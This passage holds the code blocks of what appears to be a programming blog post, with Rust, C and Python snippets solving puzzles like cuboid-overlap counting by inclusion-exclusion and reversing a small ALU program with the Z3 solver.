    idx <span class="token operator">=</span> <span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> SINE_WAVETABLE_SIZE<span class="token punctuation">;</span>
    <span class="token keyword">float</span> samp1 <span class="token operator">=</span> sine_wavetable<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Interpolate between the left and right samples to get the current sample.</span>
    <span class="token keyword">float</span> inter <span class="token operator">=</span> <span class="token punctuation">(</span>samp0 <span class="token operator">+</span> <span class="token punctuation">(</span>samp1 <span class="token operator">-</span> samp0<span class="token punctuation">)</span> <span class="token operator">*</span> frac<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Advance the phase to prepare for the next sample.</span>
    phase <span class="token operator">+=</span> SINE_WAVETABLE_SIZE <span class="token operator">*</span> freq <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">;</span>

    <span class="token keyword">return</span> inter<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">generate_samples_w</span><span class="token punctuation">(</span><span class="token keyword">float</span> freq<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> BUFFER_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">get_next_sample</span><span class="token punctuation">(</span>freq<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// We've offloaded the calculations to `get_next_sample`.</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">on x=10..12,y=10..12,z=10..12
on x=11..13,y=11..13,z=11..13
off x=9..11,y=9..11,z=9..11
on x=10..10,y=10..10,z=10..10</code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token comment">// Some useful type aliases.</span>
<span class="token attribute attr-name">#[allow(non_camel_case_types)]</span>
<span class="token keyword">type</span> <span class="token type-definition class-name">cube_t</span> <span class="token operator">=</span> <span class="token keyword">i64</span><span class="token punctuation">;</span>

<span class="token comment">// Each pair corresponds to min/max values in a dimension.</span>
<span class="token keyword">type</span> <span class="token type-definition class-name">Cuboid</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">Command</span><span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">,</span> <span class="token class-name">Cuboid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Parse takes a String and returns a Vec of Commands.</span>
<span class="token keyword">fn</span> <span class="token function-definition function">parse</span><span class="token punctuation">(</span>contents<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Command</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> re <span class="token operator">=</span> <span class="token class-name">Regex</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">r"(on|off) x=(-?\d+)..(-?\d+),y=(-?\d+)..(-?\d+),z=(-?\d+)..(-?\d+)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    contents
        <span class="token punctuation">.</span><span class="token function">lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// Split text at lines.</span>
        <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> cap <span class="token keyword">in</span> re<span class="token punctuation">.</span><span class="token function">captures_iter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// Match with regex, and get capture groups.</span>
                <span class="token keyword">return</span> <span class="token class-name">Command</span><span class="token punctuation">(</span>
                    <span class="token comment">// Capture group 0 is the entire matched string. So we start with 1, to obtain the first capture group.</span>
                    cap<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token punctuation">(</span>   <span class="token comment">// str's parse is builtin and returns an Option&lt;_&gt;.</span>
                        <span class="token punctuation">(</span>cap<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>cube_t<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cap<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>cube_t<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token punctuation">(</span>cap<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>cube_t<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cap<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>cube_t<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token punctuation">(</span>cap<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>cube_t<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cap<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>cube_t<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token macro property">unreachable!</span><span class="token punctuation">(</span><span class="token string">"aaaaaah"</span><span class="token punctuation">)</span> <span class="token comment">// Safety measure. We assume all lines follow the above pattern.</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token comment">// Solution 1: Brute-force Approach.</span>
<span class="token keyword">type</span> <span class="token type-definition class-name">Set</span> <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">brute_force</span><span class="token punctuation">(</span>cmds<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Command</span><span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">u32</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> set<span class="token punctuation">:</span> <span class="token class-name">Set</span> <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> r <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token operator">&amp;</span><span class="token class-name">Command</span><span class="token punctuation">(</span>onoff<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>y1<span class="token punctuation">,</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>z1<span class="token punctuation">,</span> z2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">in</span> cmds <span class="token punctuation">{</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> x1<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">-</span>r<span class="token punctuation">)</span><span class="token punctuation">..=</span>x2<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> y1<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">-</span>r<span class="token punctuation">)</span><span class="token punctuation">..=</span>y2<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">for</span> k <span class="token keyword">in</span> z1<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">-</span>r<span class="token punctuation">)</span><span class="token punctuation">..=</span>z2<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> onoff <span class="token punctuation">{</span>
                        set<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        set<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    set<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">u32</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token keyword">let</span> <span class="token keyword">mut</span> alternating_unions<span class="token punctuation">:</span> <span class="token class-name">LinkedList</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">&gt;&gt;</span> <span class="token operator">=</span> <span class="token class-name">LinkedList</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> lookup <span class="token operator">=</span> cmds<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token operator">&amp;</span><span class="token class-name">Command</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token closure-punctuation punctuation">|</span></span> c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span>_<span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token class-name">Command</span><span class="token punctuation">(</span>on<span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">in</span> cmds<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> v <span class="token keyword">in</span> alternating_unions<span class="token punctuation">.</span><span class="token function">iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        v<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Push the current tag.</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>alternating_unions<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> on <span class="token punctuation">{</span>
        <span class="token comment">// A new union term is added if "on" and even, or "off" and odd.</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> v <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        v<span class="token punctuation">.</span><span class="token function">reserve</span><span class="token punctuation">(</span>cmds<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Smol optimisation.</span>
        alternating_unions<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">A u B u C
|-- A
|   |-- A n B
|   |   |-- A n B n C
|   |
|   |-- A n C
|
|-- B
|   |-- B n C
|
|-- C</code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token comment">// @brief   Computes the number of points in a cuboid.</span>
<span class="token comment">// @return  Number of points in a cuboid.</span>
<span class="token keyword">fn</span> <span class="token function-definition function">eval_cuboid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>y1<span class="token punctuation">,</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>z1<span class="token punctuation">,</span> z2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Cuboid</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">u64</span> <span class="token punctuation">{</span> <span class="token punctuation">...</span> <span class="token punctuation">}</span>

<span class="token comment">// @brief   Computes the intersection of a cuboid.</span>
<span class="token comment">// @return  Some(Cuboid) if the intersection exists, None otherwise.</span>
<span class="token keyword">fn</span> <span class="token function-definition function">intersect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> z1<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Cuboid</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> z2<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Cuboid</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Cuboid</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span> <span class="token punctuation">...</span> <span class="token punctuation">}</span>

<span class="token comment">// @brief    Finds the intersection between two ranges.</span>
<span class="token comment">// @return   Some((cube_t, cube_t)) if an intersection exists, None if there is no intersection.</span>
<span class="token keyword">fn</span> <span class="token function-definition function">range_intersect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>b1<span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>cube_t<span class="token punctuation">,</span> cube_t<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span> <span class="token punctuation">...</span> <span class="token punctuation">}</span>

<span class="token comment">// @brief    eval_union computes the number of points in the union of sets `u`.</span>
<span class="token comment">//</span>
<span class="token comment">// @param    lookup: A lookup table of cuboids. Our sets will be represented as an array of indices (storing one i32 instead of six i32's).</span>
<span class="token comment">// @param    add: Whether the current iteration adds or subtracts the union.</span>
<span class="token comment">// @param    int: The current intersected cuboid.</span>
<span class="token comment">// @param    u: The set of cuboids in the current union.</span>
<span class="token keyword">fn</span> <span class="token function-definition function">eval_union</span><span class="token punctuation">(</span>lookup<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Cuboid</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> add<span class="token punctuation">:</span> <span class="token keyword">bool</span><span class="token punctuation">,</span> int<span class="token punctuation">:</span> <span class="token class-name">Cuboid</span><span class="token punctuation">,</span> u<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">usize</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">i64</span> <span class="token punctuation">{</span>
    u<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tag<span class="token punctuation">)</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token keyword">match</span> <span class="token function">intersect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>int<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lookup<span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Some</span><span class="token punctuation">(</span>next_int<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token keyword">let</span> v <span class="token operator">=</span> <span class="token function">eval_cuboid</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>next_int<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">i64</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> rest <span class="token operator">=</span> <span class="token function">eval_union</span><span class="token punctuation">(</span>lookup<span class="token punctuation">,</span> <span class="token operator">!</span>add<span class="token punctuation">,</span> next_int<span class="token punctuation">,</span> <span class="token operator">&amp;</span>u<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> add <span class="token punctuation">{</span>
                    rest <span class="token operator">+</span> v
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    rest <span class="token operator">-</span> v
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// No intersection. No need to evaluate deeper, since any intersection with the empty set will just be the empty set.</span>
            <span class="token class-name">None</span> <span class="token operator">=&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i64</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">let</span> scope <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200000</span><span class="token punctuation">,</span> <span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200000</span><span class="token punctuation">,</span> <span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200000</span><span class="token punctuation">,</span> <span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
alternating_unions
    <span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> u<span class="token punctuation">)</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token function">eval_union</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lookup<span class="token punctuation">,</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> scope<span class="token punctuation">,</span> <span class="token operator">&amp;</span>u<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i64</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token keyword">let</span> scope <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200000</span><span class="token punctuation">,</span> <span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200000</span><span class="token punctuation">,</span> <span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200000</span><span class="token punctuation">,</span> <span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">inp w
add z w
mod z 2
div w 2</code></pre>
<pre class="command-line language-python" data-prompt=">>>" data-output="4,6" tabindex="0"><code class="language-python"><span class="token keyword">import</span> z3
x <span class="token operator">=</span> z3<span class="token punctuation">.</span>Int<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>             <span class="token comment"># Create a symbol.</span>
z3<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token operator">==</span> x<span class="token punctuation">)</span>          <span class="token comment"># Tell Z3 to solve for x.</span>
<span class="token punctuation">[</span>x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">]</span>                     <span class="token comment"># Z3 found a solution!</span>
z3<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token operator">==</span> x<span class="token punctuation">,</span> x <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># Any other solutions?</span>
<span class="token punctuation">[</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">]</span>                     <span class="token comment"># uwu</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">inp w
mul x 0
add x z
mod x 26
div z 1
add x 13
eql x w
eql x 0
mul y 0
add y 25
mul y x
add y 1
mul z y
mul y 0
add y w
add y 8
mul y x
add z y
inp w
mul x 0
add x z
mod x 26
div z 1
add x 12
eql x w
eql x 0
mul y 0
add y 25
mul y x
add y 1
mul z y
mul y 0
add y w
add y 16
mul y x
add z y
inp w
mul x 0
add x z
mod x 26
[...]</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">inp w           ; Read input.
mul x 0         ; x = 0
add x z         ; x = z
mod x 26        ; x = z % 26
div z 1         ; z = z???
add x 13        ; x += 13</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    instrs <span class="token operator">=</span> <span class="token punctuation">[</span>l<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> l <span class="token keyword">in</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

n <span class="token operator">=</span> <span class="token number">14</span>  <span class="token comment"># Number of digits.</span>
block <span class="token operator">=</span> <span class="token number">18</span>

<span class="token comment"># Gather the "magic numbers" from the ALU program.</span>
addx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
addy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
divz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    divz<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>instrs<span class="token punctuation">[</span>i<span class="token operator">*</span>block <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    addx<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>instrs<span class="token punctuation">[</span>i<span class="token operator">*</span>block <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    addy<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>instrs<span class="token punctuation">[</span>i<span class="token operator">*</span>block <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Make input ints.</span>
inp <span class="token operator">=</span> <span class="token punctuation">[</span>z3<span class="token punctuation">.</span>Int<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'inp_</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># Create a Z3 solver.</span>
